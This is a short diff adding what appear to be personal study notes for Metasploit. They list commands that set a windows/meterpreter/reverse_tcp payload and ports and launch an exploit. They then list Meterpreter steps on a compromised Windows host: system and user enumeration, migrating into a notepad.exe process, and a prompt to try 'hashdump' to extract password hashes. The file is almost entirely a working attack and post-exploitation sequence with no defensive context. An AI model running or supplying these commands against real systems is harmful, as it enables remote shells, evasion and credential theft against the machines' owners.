@@ -1,0 +1,27 @@
+
+
+examples
+search <payload>
+
+
+
+
+set payload windows/meterpreter/reverse_tcp
+set LPORT 5555
+set SRVPORT 5999
+exploit
+
+now on windows:
+sysinfo
+getuid
+ps
+pwd
+cd c:\
+migrate process:
+execute -f notepad.exe
+getpid
+ps
+migrate <notepad PID>
+getpid
+
+try "hashdump" and more
